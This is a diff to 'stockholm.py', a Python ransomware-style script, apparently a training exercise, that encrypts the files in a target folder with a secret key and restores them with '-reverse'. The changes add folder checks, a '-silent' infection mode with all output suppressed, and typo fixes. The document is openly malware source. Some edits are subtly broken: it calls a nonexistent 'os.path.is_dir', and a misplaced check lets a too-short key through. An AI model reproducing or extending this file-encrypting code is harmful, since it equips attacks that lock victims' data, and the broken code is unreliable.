@@ -31,6 +31,9 @@ def encrypt_folder(path:str):
         print(f"The secret key used must be at least 16 chars long. Goodbye.")
         exit(1)
     
+    if not os.path.is_dir(path):
+        return f"Target folder '{path}' does not exist. Aborting infection."
+    
     print("======================================================================================")
     print(" ENCRYPTIMG FILES - RUINING YOUR WORLD!") 
     print("======================================================================================")
@@ -177,7 +180,7 @@ def decrypt_file(file_to_be_decrypted:str, user_secret_key:str)->bool:
 def decrypt_folder(path:str, user_secret_key:str):
     
     decrypted_files_counter = 0
-    
+
     print("======================================================================================")
     print(" DECRYPTIMG FILES - SAVNIG THE WORLD!")
     print("======================================================================================")
@@ -236,43 +239,55 @@ def main():
         vaccine. (2023, Eduard Vendrell)")
     
     # Definir los argumentos y opciones
-    parser.add_argument('-help', action='store_true', help='shows help')
     parser.add_argument('-version', '-v', action='store_true', help='prints application version.')
     parser.add_argument('-infect', '-i', metavar='"Secret Key"', help="Ruin somebody's world by infecting critical folder files.")
-    parser.add_argument('-reverse', '-r', metavar='"Secret Key"', help="Save simebody's world by recovering all infected folder files.")
+    parser.add_argument('-reverse', '-r', metavar='"Secret Key"', help="Save somebody's world by recovering all infected folder files.")
     parser.add_argument('-silent', '-s', action='store_true', help='infects target folder files in silence, with no print outs.')
 
     args = parser.parse_args()
 
-    if args.help:
-        parser.print_help()
-        
-    elif args.version:
+    if args.version:
         print('stockholm.py - Version 1.0\n')
     
     elif args.reverse:
         user_secret_key = args.reverse
         
+        # check if infection folder exists
+        if not os.path.isdir(folder_to_be_infected):
+            print(f"Target folder '{folder_to_be_infected}' does not exist. Aborting disinfection.")
+            exit(1)        
+        
         # cause relieve!!
         if args.silent:
             with contextlib.redirect_stdout(None):
-                decrypt_folder("./infection", user_secret_key)
+                decrypt_folder(folder_to_be_infected, user_secret_key)
         else:
-            decrypt_folder("./infection", user_secret_key)
+            decrypt_folder(folder_to_be_infected, user_secret_key)
     
     elif args.infect:
+        # validate Secrte Key
         if len(args.infect) < 16:
             print('Secret key must be at least 16 chars long.')
+        
+        # check if infection folder exists
+        if not os.path.isdir(folder_to_be_infected):
+            print(f"Target folder '{folder_to_be_infected}' does not exist. Aborting infection.")
+            exit(1)
+        
         else:
             global secret_key
             secret_key = args.infect
             
             # cause havoc!!!
             if args.silent:
-                with contextlib.redirect_stdout(None):
-                    encrypt_folder("./infection")
+                with contextlib.redirect_stdout(None):                   
+                    #encrypt_folder("./infection")
+                    encrypt_folder(folder_to_be_infected)
+                    
             else:
-                encrypt_folder("./infection")
+                encrypt_folder(folder_to_be_infected)
+    else:
+        parser.print_help()
 
 if __name__ == '__main__':
     main()
